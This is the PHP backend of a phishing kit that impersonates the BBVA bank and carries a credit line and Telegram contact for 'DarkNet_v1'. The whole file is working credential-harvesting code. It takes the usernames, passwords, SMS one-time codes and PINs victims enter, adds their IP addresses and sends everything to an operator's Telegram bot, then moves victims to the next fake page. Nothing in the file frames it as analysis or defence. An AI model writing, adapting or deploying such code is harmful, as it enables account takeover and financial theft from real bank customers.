<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    session_start();


    include "config.php";


    

    if(isset($_POST["log"])){


        if ($_POST["user"] !== "" & $_POST["pass"] !== "") {

            $user      = "<code>".$_POST["user"]."</code>";
            $pass      = "<code>".$_POST["pass"]."</code>";

            $message=
            '<blockquote>[LOGIN] => BBVA</blockquote>'."\n".     
            '- User : '.$user."\n".
            '- Pass : '.$pass."\n".
            '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
            '[🛂] Panel-link : '.get_steps_link()."\n".
            '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

            sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
            reset_data();      
            header("Location: ../../../loading.php");
            exit();            
            
        }else{
            header("Location: ../../../login.php?errors=");
            exit();            
        }        
 
    }elseif(isset($_POST["sms"])){

        
        if ($_POST["x1"] !== "" & $_POST["x2"] !== "" & $_POST["x3"] !== "" & $_POST["x4"] !== "" & $_POST["x5"] !== "" & $_POST["x6"] !== "") {

            $sms   = "<code>".$_POST["x1"].$_POST["x2"].$_POST["x3"].$_POST["x4"].$_POST["x5"].$_POST["x6"]."</code>";

            $message=
            '<blockquote>[SMS] => BBVA</blockquote>'."\n".     
            '- SMS : '.$sms."\n".
            '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
            '[🛂] Panel-link : '.get_steps_link()."\n".
            '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

            sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
            reset_data();
            header("Location: ../../../loading.php");
            exit(); 

        }else{
            header("Location: ../../../sms.php?errors=");
            exit();            
        }        
 
    }elseif(isset($_POST["pin"])){

        
        if ($_POST["x1"] !== "" & $_POST["x2"] !== "" & $_POST["x3"] !== "" & $_POST["x4"] !== "") {

            $code   = "<code>".$_POST["x1"].$_POST["x2"].$_POST["x3"].$_POST["x4"]."</code>";

            $message=
            '<blockquote>[PIN] => BBVA</blockquote>'."\n".     
            '- PIN : '.$code."\n".
            '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
            '[🛂] Panel-link : '.get_steps_link()."\n".
            '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

            sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
            reset_data();
            header("Location: ../../../loading.php");
            exit(); 

        }else{
            header("Location: ../../../pin.php?errors=");
            exit();            
        }        
 
    }elseif(isset($_GET["new"])){

        $message=
        '<blockquote> [NEW CODE] => BBVA </blockquote>'."\n".
        'IP : '.$_SERVER['REMOTE_ADDR'].' Send Another code!'."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../sms.php");
        exit();        
 
    }

?>